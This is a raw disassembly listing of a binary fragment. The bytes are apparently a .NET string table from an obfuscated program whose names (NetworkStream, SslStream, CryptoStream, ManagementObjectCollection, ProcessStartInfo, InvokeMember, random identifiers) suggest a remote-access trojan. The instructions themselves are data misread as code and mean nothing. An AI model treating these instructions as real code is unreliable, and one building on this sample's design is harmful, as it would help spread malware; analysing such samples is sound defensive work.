  408fa2:	74 5f                	je     0x409003
  408fa4:	49                   	dec    %ecx
  408fa5:	6e                   	outsb  %ds:(%esi),(%dx)
  408fa6:	74 65                	je     0x40900d
  408fa8:	72 76                	jb     0x409020
  408faa:	61                   	popa
  408fab:	6c                   	insb   (%dx),%es:(%edi)
  408fac:	00 6e 67             	add    %ch,0x67(%esi)
  408faf:	75 76                	jne    0x409027
  408fb1:	63 6c 00 6b          	arpl   %ebp,0x6b(%eax,%eax,1)
  408fb5:	65 72 6e             	gs jb  0x409026
  408fb8:	65 6c                	gs insb (%dx),%es:(%edi)
  408fba:	33 32                	xor    (%edx),%esi
  408fbc:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408fbf:	6c                   	insb   (%dx),%es:(%edi)
  408fc0:	00 75 73             	add    %dh,0x73(%ebp)
  408fc3:	65 72 33             	gs jb  0x408ff9
  408fc6:	32 2e                	xor    (%esi),%ch
  408fc8:	64 6c                	fs insb (%dx),%es:(%edi)
  408fca:	6c                   	insb   (%dx),%es:(%edi)
  408fcb:	00 6e 74             	add    %ch,0x74(%esi)
  408fce:	64 6c                	fs insb (%dx),%es:(%edi)
  408fd0:	6c                   	insb   (%dx),%es:(%edi)
  408fd1:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408fd4:	6c                   	insb   (%dx),%es:(%edi)
  408fd5:	00 4b 69             	add    %cl,0x69(%ebx)
  408fd8:	6c                   	insb   (%dx),%es:(%edi)
  408fd9:	6c                   	insb   (%dx),%es:(%edi)
  408fda:	00 50 6f             	add    %dl,0x6f(%eax)
  408fdd:	6c                   	insb   (%dx),%es:(%edi)
  408fde:	6c                   	insb   (%dx),%es:(%edi)
  408fdf:	00 66 67             	add    %ah,0x67(%esi)
  408fe2:	54                   	push   %esp
  408fe3:	6f                   	outsl  %ds:(%esi),(%dx)
  408fe4:	6e                   	outsb  %ds:(%esi),(%dx)
  408fe5:	74 58                	je     0x40903f
  408fe7:	4c                   	dec    %esp
  408fe8:	56                   	push   %esi
  408fe9:	73 4b                	jae    0x409036
  408feb:	6d                   	insl   (%dx),%es:(%edi)
  408fec:	00 46 69             	add    %al,0x69(%esi)
  408fef:	6c                   	insb   (%dx),%es:(%edi)
  408ff0:	65 53                	gs push %ebx
  408ff2:	74 72                	je     0x409066
  408ff4:	65 61                	gs popa
  408ff6:	6d                   	insl   (%dx),%es:(%edi)
  408ff7:	00 4e 65             	add    %cl,0x65(%esi)
  408ffa:	74 77                	je     0x409073
  408ffc:	6f                   	outsl  %ds:(%esi),(%dx)
  408ffd:	72 6b                	jb     0x40906a
  408fff:	53                   	push   %ebx
  409000:	74 72                	je     0x409074
  409002:	65 61                	gs popa
  409004:	6d                   	insl   (%dx),%es:(%edi)
  409005:	00 53 73             	add    %dl,0x73(%ebx)
  409008:	6c                   	insb   (%dx),%es:(%edi)
  409009:	53                   	push   %ebx
  40900a:	74 72                	je     0x40907e
  40900c:	65 61                	gs popa
  40900e:	6d                   	insl   (%dx),%es:(%edi)
  40900f:	00 43 72             	add    %al,0x72(%ebx)
  409012:	79 70                	jns    0x409084
  409014:	74 6f                	je     0x409085
  409016:	53                   	push   %ebx
  409017:	74 72                	je     0x40908b
  409019:	65 61                	gs popa
  40901b:	6d                   	insl   (%dx),%es:(%edi)
  40901c:	00 47 5a             	add    %al,0x5a(%edi)
  40901f:	69 70 53 74 72 65 61 	imul   $0x61657274,0x53(%eax),%esi
  409026:	6d                   	insl   (%dx),%es:(%edi)
  409027:	00 4d 65             	add    %cl,0x65(%ebp)
  40902a:	6d                   	insl   (%dx),%es:(%edi)
  40902b:	6f                   	outsl  %ds:(%esi),(%dx)
  40902c:	72 79                	jb     0x4090a7
  40902e:	53                   	push   %ebx
  40902f:	74 72                	je     0x4090a3
  409031:	65 61                	gs popa
  409033:	6d                   	insl   (%dx),%es:(%edi)
  409034:	00 67 65             	add    %ah,0x65(%edi)
  409037:	74 5f                	je     0x409098
  409039:	49                   	dec    %ecx
  40903a:	74 65                	je     0x4090a1
  40903c:	6d                   	insl   (%dx),%es:(%edi)
  40903d:	00 67 65             	add    %ah,0x65(%edi)
  409040:	74 5f                	je     0x4090a1
  409042:	49                   	dec    %ecx
  409043:	73 36                	jae    0x40907b
  409045:	34 42                	xor    $0x42,%al
  409047:	69 74 4f 70 65 72 61 	imul   $0x74617265,0x70(%edi,%ecx,2),%esi
  40904e:	74 
  40904f:	69 6e 67 53 79 73 74 	imul   $0x74737953,0x67(%esi),%ebp
  409056:	65 6d                	gs insl (%dx),%es:(%edi)
  409058:	00 53 72             	add    %dl,0x72(%ebx)
  40905b:	4a                   	dec    %edx
  40905c:	62 77 6c             	bound  %esi,0x6c(%edi)
  40905f:	54                   	push   %esp
  409060:	4d                   	dec    %ebp
  409061:	6f                   	outsl  %ds:(%esi),(%dx)
  409062:	78 43                	js     0x4090a7
  409064:	6d                   	insl   (%dx),%es:(%edi)
  409065:	67 6d                	insl   (%dx),%es:(%di)
  409067:	00 53 79             	add    %dl,0x79(%ebx)
  40906a:	6d                   	insl   (%dx),%es:(%edi)
  40906b:	6d                   	insl   (%dx),%es:(%edi)
  40906c:	65 74 72             	gs je  0x4090e1
  40906f:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  409076:	69 74 68 6d 00 41 73 	imul   $0x79734100,0x6d(%eax,%ebp,2),%esi
  40907d:	79 
  40907e:	6d                   	insl   (%dx),%es:(%edi)
  40907f:	6d                   	insl   (%dx),%es:(%edi)
  409080:	65 74 72             	gs je  0x4090f5
  409083:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  40908a:	69 74 68 6d 00 48 61 	imul   $0x73614800,0x6d(%eax,%ebp,2),%esi
  409091:	73 
  409092:	68 41 6c 67 6f       	push   $0x6f676c41
  409097:	72 69                	jb     0x409102
  409099:	74 68                	je     0x409103
  40909b:	6d                   	insl   (%dx),%es:(%edi)
  40909c:	00 54 72 69          	add    %dl,0x69(%edx,%esi,2)
  4090a0:	6d                   	insl   (%dx),%es:(%edi)
  4090a1:	00 57 63             	add    %dl,0x63(%edi)
  4090a4:	4a                   	dec    %edx
  4090a5:	6c                   	insb   (%dx),%es:(%edi)
  4090a6:	6d                   	insl   (%dx),%es:(%edi)
  4090a7:	4e                   	dec    %esi
  4090a8:	6d                   	insl   (%dx),%es:(%edi)
  4090a9:	63 6f 6d             	arpl   %ebp,0x6d(%edi)
  4090ac:	00 52 61             	add    %dl,0x61(%edx)
  4090af:	6e                   	outsb  %ds:(%esi),(%dx)
  4090b0:	64 6f                	outsl  %fs:(%esi),(%dx)
  4090b2:	6d                   	insl   (%dx),%es:(%edi)
  4090b3:	00 49 43             	add    %cl,0x43(%ecx)
  4090b6:	72 79                	jb     0x409131
  4090b8:	70 74                	jo     0x40912e
  4090ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4090bb:	54                   	push   %esp
  4090bc:	72 61                	jb     0x40911f
  4090be:	6e                   	outsb  %ds:(%esi),(%dx)
  4090bf:	73 66                	jae    0x409127
  4090c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4090c2:	72 6d                	jb     0x409131
  4090c4:	00 45 6e             	add    %al,0x6e(%ebp)
  4090c7:	75 6d                	jne    0x409136
  4090c9:	00 5a 68             	add    %bl,0x68(%edx)
  4090cc:	7a 77                	jp     0x409145
  4090ce:	66 6b 51 6c 42       	imul   $0x42,0x6c(%ecx),%dx
  4090d3:	66 43                	inc    %bx
  4090d5:	61                   	popa
  4090d6:	78 6d                	js     0x409145
  4090d8:	00 41 44             	add    %al,0x44(%ecx)
  4090db:	6b 42 75 64          	imul   $0x64,0x75(%edx),%eax
  4090df:	71 68                	jno    0x409149
  4090e1:	63 51 52             	arpl   %edx,0x52(%ecx)
  4090e4:	6e                   	outsb  %ds:(%esi),(%dx)
  4090e5:	00 6a 44             	add    %ch,0x44(%edx)
  4090e8:	77 43                	ja     0x40912d
  4090ea:	78 6e                	js     0x40915a
  4090ec:	67 5a                	addr16 pop %edx
  4090ee:	72 55                	jb     0x409145
  4090f0:	6e                   	outsb  %ds:(%esi),(%dx)
  4090f1:	00 55 63             	add    %dl,0x63(%ebp)
  4090f4:	77 45                	ja     0x40913b
  4090f6:	6e                   	outsb  %ds:(%esi),(%dx)
  4090f7:	49                   	dec    %ecx
  4090f8:	72 4a                	jb     0x409144
  4090fa:	4c                   	dec    %esp
  4090fb:	57                   	push   %edi
  4090fc:	6e                   	outsb  %ds:(%esi),(%dx)
  4090fd:	00 55 6e             	add    %dl,0x6e(%ebp)
  409100:	67 68 6a 53 59 44    	addr16 push $0x4459536a
  409106:	67 5a                	addr16 pop %edx
  409108:	6e                   	outsb  %ds:(%esi),(%dx)
  409109:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  40910d:	6f                   	outsl  %ds:(%esi),(%dx)
  40910e:	6f                   	outsl  %ds:(%esi),(%dx)
  40910f:	6c                   	insb   (%dx),%es:(%edi)
  409110:	65 61                	gs popa
  409112:	6e                   	outsb  %ds:(%esi),(%dx)
  409113:	00 4d 61             	add    %cl,0x61(%ebp)
  409116:	69 6e 00 58 35 30 39 	imul   $0x39303558,0x0(%esi),%ebp
  40911d:	43                   	inc    %ebx
  40911e:	68 61 69 6e 00       	push   $0x6e6961
  409123:	41                   	inc    %ecx
  409124:	70 70                	jo     0x409196
  409126:	44                   	inc    %esp
  409127:	6f                   	outsl  %ds:(%esi),(%dx)
  409128:	6d                   	insl   (%dx),%es:(%edi)
  409129:	61                   	popa
  40912a:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  409131:	43                   	inc    %ebx
  409132:	75 72                	jne    0x4091a6
  409134:	72 65                	jb     0x40919b
  409136:	6e                   	outsb  %ds:(%esi),(%dx)
  409137:	74 44                	je     0x40917d
  409139:	6f                   	outsl  %ds:(%esi),(%dx)
  40913a:	6d                   	insl   (%dx),%es:(%edi)
  40913b:	61                   	popa
  40913c:	69 6e 00 4a 6f 69 6e 	imul   $0x6e696f4a,0x0(%esi),%ebp
  409143:	00 64 4e 48          	add    %ah,0x48(%esi,%ecx,2)
  409147:	4a                   	dec    %edx
  409148:	4a                   	dec    %edx
  409149:	4f                   	dec    %edi
  40914a:	6d                   	insl   (%dx),%es:(%edi)
  40914b:	4c                   	dec    %esp
  40914c:	6c                   	insb   (%dx),%es:(%edi)
  40914d:	58                   	pop    %eax
  40914e:	56                   	push   %esi
  40914f:	66 72 6b             	data16 jb 0x4091bd
  409152:	6e                   	outsb  %ds:(%esi),(%dx)
  409153:	00 63 71             	add    %ah,0x71(%ebx)
  409156:	54                   	push   %esp
  409157:	4e                   	dec    %esi
  409158:	71 51                	jno    0x4091ab
  40915a:	70 4b                	jo     0x4091a7
  40915c:	79 69                	jns    0x4091c7
  40915e:	50                   	push   %eax
  40915f:	6f                   	outsl  %ds:(%esi),(%dx)
  409160:	67 6c                	insb   (%dx),%es:(%di)
  409162:	6e                   	outsb  %ds:(%esi),(%dx)
  409163:	00 43 68             	add    %al,0x68(%ebx)
  409166:	6c                   	insb   (%dx),%es:(%edi)
  409167:	65 74 59             	gs je  0x4091c3
  40916a:	53                   	push   %ebx
  40916b:	72 67                	jb     0x4091d4
  40916d:	4b                   	dec    %ebx
  40916e:	6d                   	insl   (%dx),%es:(%edi)
  40916f:	6e                   	outsb  %ds:(%esi),(%dx)
  409170:	00 47 65             	add    %al,0x65(%edi)
  409173:	74 46                	je     0x4091bb
  409175:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
  40917c:	57 
  40917d:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
  409184:	78 
  409185:	74 65                	je     0x4091ec
  409187:	6e                   	outsb  %ds:(%esi),(%dx)
  409188:	73 69                	jae    0x4091f3
  40918a:	6f                   	outsl  %ds:(%esi),(%dx)
  40918b:	6e                   	outsb  %ds:(%esi),(%dx)
  40918c:	00 67 65             	add    %ah,0x65(%edi)
  40918f:	74 5f                	je     0x4091f0
  409191:	4f                   	dec    %edi
  409192:	53                   	push   %ebx
  409193:	56                   	push   %esi
  409194:	65 72 73             	gs jb  0x40920a
  409197:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  40919e:	74 65                	je     0x409205
  4091a0:	6d                   	insl   (%dx),%es:(%edi)
  4091a1:	2e 49                	cs dec %ecx
  4091a3:	4f                   	dec    %edi
  4091a4:	2e 43                	cs inc %ebx
  4091a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4091a7:	6d                   	insl   (%dx),%es:(%edi)
  4091a8:	70 72                	jo     0x40921c
  4091aa:	65 73 73             	gs jae 0x409220
  4091ad:	69 6f 6e 00 41 70 70 	imul   $0x70704100,0x6e(%edi),%ebp
  4091b4:	6c                   	insb   (%dx),%es:(%edi)
  4091b5:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  4091bc:	00 53 79             	add    %dl,0x79(%ebx)
  4091bf:	73 74                	jae    0x409235
  4091c1:	65 6d                	gs insl (%dx),%es:(%edi)
  4091c3:	2e 53                	cs push %ebx
  4091c5:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4091c9:	69 74 79 2e 41 75 74 	imul   $0x68747541,0x2e(%ecx,%edi,2),%esi
  4091d0:	68 
  4091d1:	65 6e                	outsb  %gs:(%esi),(%dx)
  4091d3:	74 69                	je     0x40923e
  4091d5:	63 61 74             	arpl   %esp,0x74(%ecx)
  4091d8:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  4091df:	74 65                	je     0x409246
  4091e1:	6d                   	insl   (%dx),%es:(%edi)
  4091e2:	2e 52                	cs push %edx
  4091e4:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  4091e7:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4091ec:	6e                   	outsb  %ds:(%esi),(%dx)
  4091ed:	00 58 35             	add    %bl,0x35(%eax)
  4091f0:	30 39                	xor    %bh,(%ecx)
  4091f2:	43                   	inc    %ebx
  4091f3:	65 72 74             	gs jb  0x40926a
  4091f6:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4091fd:	43                   	inc    %ebx
  4091fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4091ff:	6c                   	insb   (%dx),%es:(%edi)
  409200:	6c                   	insb   (%dx),%es:(%edi)
  409201:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409206:	6e                   	outsb  %ds:(%esi),(%dx)
  409207:	00 4d 61             	add    %cl,0x61(%ebp)
  40920a:	6e                   	outsb  %ds:(%esi),(%dx)
  40920b:	61                   	popa
  40920c:	67 65 6d             	gs insl (%dx),%es:(%di)
  40920f:	65 6e                	outsb  %gs:(%esi),(%dx)
  409211:	74 4f                	je     0x409262
  409213:	62 6a 65             	bound  %ebp,0x65(%edx)
  409216:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  40921a:	6c                   	insb   (%dx),%es:(%edi)
  40921b:	6c                   	insb   (%dx),%es:(%edi)
  40921c:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409221:	6e                   	outsb  %ds:(%esi),(%dx)
  409222:	00 73 65             	add    %dh,0x65(%ebx)
  409225:	74 5f                	je     0x409286
  409227:	50                   	push   %eax
  409228:	6f                   	outsl  %ds:(%esi),(%dx)
  409229:	73 69                	jae    0x409294
  40922b:	74 69                	je     0x409296
  40922d:	6f                   	outsl  %ds:(%esi),(%dx)
  40922e:	6e                   	outsb  %ds:(%esi),(%dx)
  40922f:	00 43 72             	add    %al,0x72(%ebx)
  409232:	79 70                	jns    0x4092a4
  409234:	74 6f                	je     0x4092a5
  409236:	67 72 61             	addr16 jb 0x40929a
  409239:	70 68                	jo     0x4092a3
  40923b:	69 63 45 78 63 65 70 	imul   $0x70656378,0x45(%ebx),%esp
  409242:	74 69                	je     0x4092ad
  409244:	6f                   	outsl  %ds:(%esi),(%dx)
  409245:	6e                   	outsb  %ds:(%esi),(%dx)
  409246:	00 41 72             	add    %al,0x72(%ecx)
  409249:	67 75 6d             	addr16 jne 0x4092b9
  40924c:	65 6e                	outsb  %gs:(%esi),(%dx)
  40924e:	74 4e                	je     0x40929e
  409250:	75 6c                	jne    0x4092be
  409252:	6c                   	insb   (%dx),%es:(%edi)
  409253:	45                   	inc    %ebp
  409254:	78 63                	js     0x4092b9
  409256:	65 70 74             	gs jo  0x4092cd
  409259:	69 6f 6e 00 41 72 67 	imul   $0x67724100,0x6e(%edi),%ebp
  409260:	75 6d                	jne    0x4092cf
  409262:	65 6e                	outsb  %gs:(%esi),(%dx)
  409264:	74 45                	je     0x4092ab
  409266:	78 63                	js     0x4092cb
  409268:	65 70 74             	gs jo  0x4092df
  40926b:	69 6f 6e 00 52 4c 69 	imul   $0x694c5200,0x6e(%edi),%ebp
  409272:	4b                   	dec    %ebx
  409273:	78 6b                	js     0x4092e0
  409275:	79 56                	jns    0x4092cd
  409277:	6a 4d                	push   $0x4d
  409279:	62 41 6f             	bound  %eax,0x6f(%ecx)
  40927c:	00 46 4d             	add    %al,0x4d(%esi)
  40927f:	6e                   	outsb  %ds:(%esi),(%dx)
  409280:	4e                   	dec    %esi
  409281:	44                   	inc    %esp
  409282:	72 6e                	jb     0x4092f2
  409284:	50                   	push   %eax
  409285:	4f                   	dec    %edi
  409286:	6f                   	outsl  %ds:(%esi),(%dx)
  409287:	00 4e 7a             	add    %cl,0x7a(%esi)
  40928a:	42                   	inc    %edx
  40928b:	51                   	push   %ecx
  40928c:	51                   	push   %ecx
  40928d:	55                   	push   %ebp
  40928e:	67 77 63             	addr16 ja 0x4092f4
  409291:	53                   	push   %ebx
  409292:	77 44                	ja     0x4092d8
  409294:	6a 4f                	push   $0x4f
  409296:	6f                   	outsl  %ds:(%esi),(%dx)
  409297:	00 42 47             	add    %al,0x47(%edx)
  40929a:	58                   	pop    %eax
  40929b:	56                   	push   %esi
  40929c:	5a                   	pop    %edx
  40929d:	61                   	popa
  40929e:	72 4f                	jb     0x4092ef
  4092a0:	70 47                	jo     0x4092e9
  4092a2:	66 79 68             	data16 jns 0x40930d
  4092a5:	4b                   	dec    %ebx
  4092a6:	65 6f                	outsl  %gs:(%esi),(%dx)
  4092a8:	00 49 6d             	add    %cl,0x6d(%ecx)
  4092ab:	61                   	popa
  4092ac:	67 65 43             	addr16 gs inc %ebx
  4092af:	6f                   	outsl  %ds:(%esi),(%dx)
  4092b0:	64 65 63 49 6e       	fs arpl %ecx,%gs:0x6e(%ecx)
  4092b5:	66 6f                	outsw  %ds:(%esi),(%dx)
  4092b7:	00 46 69             	add    %al,0x69(%esi)
  4092ba:	6c                   	insb   (%dx),%es:(%edi)
  4092bb:	65 49                	gs dec %ecx
  4092bd:	6e                   	outsb  %ds:(%esi),(%dx)
  4092be:	66 6f                	outsw  %ds:(%esi),(%dx)
  4092c0:	00 44 72 69          	add    %al,0x69(%edx,%esi,2)
  4092c4:	76 65                	jbe    0x40932b
  4092c6:	49                   	dec    %ecx
  4092c7:	6e                   	outsb  %ds:(%esi),(%dx)
  4092c8:	66 6f                	outsw  %ds:(%esi),(%dx)
  4092ca:	00 46 69             	add    %al,0x69(%esi)
  4092cd:	6c                   	insb   (%dx),%es:(%edi)
  4092ce:	65 53                	gs push %ebx
  4092d0:	79 73                	jns    0x409345
  4092d2:	74 65                	je     0x409339
  4092d4:	6d                   	insl   (%dx),%es:(%edi)
  4092d5:	49                   	dec    %ecx
  4092d6:	6e                   	outsb  %ds:(%esi),(%dx)
  4092d7:	66 6f                	outsw  %ds:(%esi),(%dx)
  4092d9:	00 43 6f             	add    %al,0x6f(%ebx)
  4092dc:	6d                   	insl   (%dx),%es:(%edi)
  4092dd:	70 75                	jo     0x409354
  4092df:	74 65                	je     0x409346
  4092e1:	72 49                	jb     0x40932c
  4092e3:	6e                   	outsb  %ds:(%esi),(%dx)
  4092e4:	66 6f                	outsw  %ds:(%esi),(%dx)
  4092e6:	00 43 53             	add    %al,0x53(%ebx)
  4092e9:	68 61 72 70 41       	push   $0x41707261
  4092ee:	72 67                	jb     0x409357
  4092f0:	75 6d                	jne    0x40935f
  4092f2:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092f4:	74 49                	je     0x40933f
  4092f6:	6e                   	outsb  %ds:(%esi),(%dx)
  4092f7:	66 6f                	outsw  %ds:(%esi),(%dx)
  4092f9:	00 50 72             	add    %dl,0x72(%eax)
  4092fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4092fd:	63 65 73             	arpl   %esp,0x73(%ebp)
  409300:	73 53                	jae    0x409355
  409302:	74 61                	je     0x409365
  409304:	72 74                	jb     0x40937a
  409306:	49                   	dec    %ecx
  409307:	6e                   	outsb  %ds:(%esi),(%dx)
  409308:	66 6f                	outsw  %ds:(%esi),(%dx)
  40930a:	00 78 64             	add    %bh,0x64(%eax)
  40930d:	5a                   	pop    %edx
  40930e:	4b                   	dec    %ebx
  40930f:	47                   	inc    %edi
  409310:	41                   	inc    %ecx
  409311:	78 55                	js     0x409368
  409313:	63 6b 6f             	arpl   %ebp,0x6f(%ebx)
  409316:	00 46 49             	add    %al,0x49(%esi)
  409319:	41                   	inc    %ecx
  40931a:	6c                   	insb   (%dx),%es:(%edi)
  40931b:	6b 48 75 64          	imul   $0x64,0x75(%eax),%ecx
  40931f:	65 75 6f             	gs jne 0x409391
  409322:	00 76 53             	add    %dh,0x53(%esi)
  409325:	67 41                	addr16 inc %ecx
  409327:	75 67                	jne    0x409390
  409329:	70 65                	jo     0x409390
  40932b:	62 6f 51             	bound  %ebp,0x51(%edi)
  40932e:	78 79                	js     0x4093a9
  409330:	45                   	inc    %ebp
  409331:	70 00                	jo     0x409333
  409333:	51                   	push   %ecx
  409334:	6d                   	insl   (%dx),%es:(%edi)
  409335:	57                   	push   %edi
  409336:	78 41                	js     0x409379
  409338:	57                   	push   %edi
  409339:	65 6f                	outsl  %gs:(%esi),(%dx)
  40933b:	6a 45                	push   $0x45
  40933d:	70 6b                	jo     0x4093aa
  40933f:	54                   	push   %esp
  409340:	43                   	inc    %ebx
  409341:	4a                   	dec    %edx
  409342:	56                   	push   %esi
  409343:	70 00                	jo     0x409345
  409345:	79 57                	jns    0x40939e
  409347:	4c                   	dec    %esp
  409348:	76 70                	jbe    0x4093ba
  40934a:	53                   	push   %ebx
  40934b:	43                   	inc    %ebx
  40934c:	41                   	inc    %ecx
  40934d:	58                   	pop    %eax
  40934e:	4b                   	dec    %ebx
  40934f:	49                   	dec    %ecx
  409350:	72 57                	jb     0x4093a9
  409352:	70 00                	jo     0x409354
  409354:	53                   	push   %ebx
  409355:	6c                   	insb   (%dx),%es:(%edi)
  409356:	65 65 70 00          	gs gs jo 0x40935a
  40935a:	47                   	inc    %edi
  40935b:	6d                   	insl   (%dx),%es:(%edi)
  40935c:	63 4b 4a             	arpl   %ecx,0x4a(%ebx)
  40935f:	70 75                	jo     0x4093d6
  409361:	56                   	push   %esi
  409362:	76 49                	jbe    0x4093ad
  409364:	68 70 00 64 74       	push   $0x74640070
  409369:	43                   	inc    %ebx
  40936a:	65 72 4f             	gs jb  0x4093bc
  40936d:	54                   	push   %esp
  40936e:	48                   	dec    %eax
  40936f:	41                   	inc    %ecx
  409370:	4b                   	dec    %ebx
  409371:	53                   	push   %ebx
  409372:	6c                   	insb   (%dx),%es:(%edi)
  409373:	70 00                	jo     0x409375
  409375:	65 75 6e             	gs jne 0x4093e6
  409378:	73 77                	jae    0x4093f1
  40937a:	4c                   	dec    %esp
  40937b:	64 72 4c             	fs jb  0x4093ca
  40937e:	6d                   	insl   (%dx),%es:(%edi)
  40937f:	70 00                	jo     0x409381
  409381:	52                   	push   %edx
  409382:	66 52                	push   %dx
  409384:	48                   	dec    %eax
  409385:	76 4a                	jbe    0x4093d1
  409387:	46                   	inc    %esi
  409388:	47                   	inc    %edi
  409389:	7a 56                	jp     0x4093e1
  40938b:	4f                   	dec    %edi
  40938c:	76 70                	jbe    0x4093fe
  40938e:	70 00                	jo     0x409390
  409390:	4d                   	dec    %ebp
  409391:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  409398:	74 2e                	je     0x4093c8
  40939a:	43                   	inc    %ebx
  40939b:	53                   	push   %ebx
  40939c:	68 61 72 70 00       	push   $0x707261
  4093a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4093a2:	6e                   	outsb  %ds:(%esi),(%dx)
  4093a3:	45                   	inc    %ebp
  4093a4:	79 6e                	jns    0x409414
  4093a6:	6c                   	insb   (%dx),%es:(%edi)
  4093a7:	59                   	pop    %ecx
  4093a8:	54                   	push   %esp
  4093a9:	75 7a                	jne    0x409425
  4093ab:	70 00                	jo     0x4093ad
  4093ad:	46                   	inc    %esi
  4093ae:	6c                   	insb   (%dx),%es:(%edi)
  4093af:	73 51                	jae    0x409402
  4093b1:	65 7a 4e             	gs jp  0x409402
  4093b4:	65 70 5a             	gs jo  0x409411
  4093b7:	54                   	push   %esp
  4093b8:	63 77 64             	arpl   %esi,0x64(%edi)
  4093bb:	41                   	inc    %ecx
  4093bc:	71 00                	jno    0x4093be
  4093be:	61                   	popa
  4093bf:	7a 4a                	jp     0x40940b
  4093c1:	56                   	push   %esi
  4093c2:	46                   	inc    %esi
  4093c3:	77 69                	ja     0x40942e
  4093c5:	47                   	inc    %edi
  4093c6:	65 51                	gs push %ecx
  4093c8:	71 00                	jno    0x4093ca
  4093ca:	58                   	pop    %eax
  4093cb:	47                   	inc    %edi
  4093cc:	64 46                	fs inc %esi
  4093ce:	6a 4b                	push   $0x4b
  4093d0:	64 79 79             	fs jns 0x40944c
  4093d3:	55                   	push   %ebp
  4093d4:	76 62                	jbe    0x409438
  4093d6:	52                   	push   %edx
  4093d7:	71 00                	jno    0x4093d9
  4093d9:	63 55 59             	arpl   %edx,0x59(%ebp)
  4093dc:	61                   	popa
  4093dd:	75 51                	jne    0x409430
  4093df:	72 62                	jb     0x409443
  4093e1:	44                   	inc    %esp
  4093e2:	50                   	push   %eax
  4093e3:	43                   	inc    %ebx
  4093e4:	54                   	push   %esp
  4093e5:	71 00                	jno    0x4093e7
  4093e7:	52                   	push   %edx
  4093e8:	67 58                	addr16 pop %eax
  4093ea:	46                   	inc    %esi
  4093eb:	4f                   	dec    %edi
  4093ec:	46                   	inc    %esi
  4093ed:	4b                   	dec    %ebx
  4093ee:	51                   	push   %ecx
  4093ef:	48                   	dec    %eax
  4093f0:	43                   	inc    %ebx
  4093f1:	59                   	pop    %ecx
  4093f2:	55                   	push   %ebp
  4093f3:	50                   	push   %eax
  4093f4:	55                   	push   %ebp
  4093f5:	71 00                	jno    0x4093f7
  4093f7:	4d                   	dec    %ebp
  4093f8:	52                   	push   %edx
  4093f9:	73 52                	jae    0x40944d
  4093fb:	75 59                	jne    0x409456
  4093fd:	55                   	push   %ebp
  4093fe:	79 6e                	jns    0x40946e
  409400:	51                   	push   %ecx
  409401:	4f                   	dec    %edi
  409402:	56                   	push   %esi
  409403:	71 00                	jno    0x409405
  409405:	66 5a                	pop    %dx
  409407:	57                   	push   %edi
  409408:	5a                   	pop    %edx
  409409:	70 54                	jo     0x40945f
  40940b:	64 55                	fs push %ebp
  40940d:	4d                   	dec    %ebp
  40940e:	56                   	push   %esi
  40940f:	57                   	push   %edi
  409410:	71 00                	jno    0x409412
  409412:	53                   	push   %ebx
  409413:	79 73                	jns    0x409488
  409415:	74 65                	je     0x40947c
  409417:	6d                   	insl   (%dx),%es:(%edi)
  409418:	2e 4c                	cs dec %esp
  40941a:	69 6e 71 00 49 77 77 	imul   $0x77774900,0x71(%esi),%ebp
  409421:	4c                   	dec    %esp
  409422:	63 72 74             	arpl   %esi,0x74(%edx)
  409425:	43                   	inc    %ebx
  409426:	59                   	pop    %ecx
  409427:	45                   	inc    %ebp
  409428:	73 73                	jae    0x40949d
  40942a:	43                   	inc    %ebx
  40942b:	72 00                	jb     0x40942d
  40942d:	43                   	inc    %ebx
  40942e:	78 48                	js     0x409478
  409430:	52                   	push   %edx
  409431:	55                   	push   %ebp
  409432:	6e                   	outsb  %ds:(%esi),(%dx)
  409433:	54                   	push   %esp
  409434:	61                   	popa
  409435:	5a                   	pop    %edx
  409436:	65 53                	gs push %ebx
  409438:	46                   	inc    %esi
  409439:	72 00                	jb     0x40943b
  40943b:	74 52                	je     0x40948f
  40943d:	56                   	push   %esi
  40943e:	70 77                	jo     0x4094b7
  409440:	43                   	inc    %ebx
  409441:	53                   	push   %ebx
  409442:	74 71                	je     0x4094b5
  409444:	55                   	push   %ebp
  409445:	72 00                	jb     0x409447
  409447:	75 6b                	jne    0x4094b4
  409449:	6b 4d 4a 51          	imul   $0x51,0x4a(%ebp),%ecx
  40944d:	79 70                	jns    0x4094bf
  40944f:	70 64                	jo     0x4094b5
  409451:	62 56 72             	bound  %edx,0x72(%esi)
  409454:	00 43 6c             	add    %al,0x6c(%ebx)
  409457:	65 61                	gs popa
  409459:	72 00                	jb     0x40945b
  40945b:	43                   	inc    %ebx
  40945c:	68 61 72 00 49       	push   $0x49007261
  409461:	6e                   	outsb  %ds:(%esi),(%dx)
  409462:	76 6f                	jbe    0x4094d3
  409464:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  409468:	6d                   	insl   (%dx),%es:(%edi)
  409469:	62 65 72             	bound  %esp,0x72(%ebp)
  40946c:	00 4d 44             	add    %cl,0x44(%ebp)
  40946f:	35 43 72 79 70       	xor    $0x70797243,%eax
  409474:	74 6f                	je     0x4094e5
